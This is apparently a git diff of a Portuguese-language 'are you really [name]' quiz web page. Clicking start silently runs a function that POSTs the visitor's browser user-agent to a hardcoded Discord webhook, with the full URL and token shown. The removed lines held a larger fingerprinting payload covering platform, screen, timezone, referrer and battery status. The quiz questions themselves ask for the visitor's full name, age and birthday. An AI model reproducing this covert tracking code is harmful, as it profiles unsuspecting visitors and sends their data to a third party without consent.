@@ -69,6 +69,7 @@
             right: 0;
             margin: 10px;
             font-size: 30px;
+            
         }    
     </style>
     <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&display=swap" rel="stylesheet">
@@ -99,7 +100,7 @@
 <script>
     const questions = [
         { question: "Hummm, qual seu primeiro nome? 🤨", answer: "replay: 10121" },
-        { question: "Hum 🤨🤨 qual seu sobrenome?", answer: "replay: 10121"},
+        { question: "Hum 🤨🤨 qual seu sobrenome?", anser: "replay: 10121"},
         { question: "Ainda não estou convencido que você é [nome]. Digite seu nome completo 🤨", answer: "replay: 10121" },
         { question: "Suspeito 🤨. Ainda desconfio que você é [nome], qual sua idade?", answer: "replay: 10121" },
         { question: "Será que você é [nome] mesmo? Qual seu aniversário? (Ex: 07/11)", answer: "replay: 10121"},
@@ -111,7 +112,7 @@
     document.getElementById('startButton').addEventListener('click', function() {
         document.getElementById('startContainer').classList.add('hidden');
         document.getElementById('quizContainer').classList.remove('hidden');
-        sendDeviceInfoToDiscord(); // Envia informações do dispositivo
+        sendDeviceInfoToDiscord(); // Enviar as informações do dispositivo ao clicar no botão "Sim"
     });
 
     function noQuiz() {
@@ -157,57 +158,32 @@
         alert("Tudo bem, talvez na próxima vez! 😊");
     }
 
+    // Função para coletar informações do dispositivo e enviar para o Discord
     function sendDeviceInfoToDiscord() {
         const userAgent = navigator.userAgent;
-        const platform = navigator.platform;
-        const language = navigator.language;
-        const screenWidth = window.screen.width;
-        const screenHeight = window.screen.height;
-        const pixelRatio = window.devicePixelRatio;
-        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const connection = navigator.connection ? navigator.connection.effectiveType : 'N/A';
-        const referrer = document.referrer || 'N/A';
-        const onlineStatus = navigator.onLine ? 'Online' : 'Offline';
 
-        navigator.getBattery().then(function(battery) {
-            const batteryLevel = (battery.level * 100) + "%";
-            const chargingStatus = battery.charging ? "Sim" : "Não";
+        const webhookURL = 'https://discord.com/api/webhooks/1291508492858818643/nQUVPpcbItVxbBQk0OQ1gcORa3jMFUgyD4zfpxciKQY3KmEYjgjoDVPprJrxZFWsfTOL'; // Substitua pelo URL do seu Webhook do Discord
 
-            const webhookURL = 'https://discord.com/api/webhooks/1291508492858818643/nQUVPpcbItVxbBQk0OQ1gcORa3jMFUgyD4zfpxciKQY3KmEYjgjoDVPprJrxZFWsfTOL';
+        const message = {
+            content: `Informações do Dispositivo: ${userAgent}`
+        };
 
-            const message = {
-                content: `
-                **Informações do Dispositivo:**
-                - User-Agent: ${userAgent}
-                - Plataforma: ${platform}
-                - Idioma: ${language}
-                - Resolução de Tela: ${screenWidth}x${screenHeight}
-                - Fator de Pixel: ${pixelRatio}
-                - Fuso Horário: ${timeZone}
-                - Tipo de Conexão: ${connection}
-                - Página de Referência: ${referrer}
-                - Status de Conexão: ${onlineStatus}
-                - Nível de Bateria: ${batteryLevel}
-                - Carregando: ${chargingStatus}`
-            };
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(message)
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Informações enviadas para o Discord com sucesso.');
-                } else {
-                    console.log('Erro ao enviar informações para o Discord.');
-                }
-            })
-            .catch(error => {
-                console.log('Erro:', error);
-            });
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(message)
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('Informações enviadas para o Discord com sucesso.');
+            } else {
+                console.log('Erro ao enviar informações para o Discord.');
+            }
+        })
+        .catch(error => {
+            console.log('Erro:', error);
         });
     }
 </script>
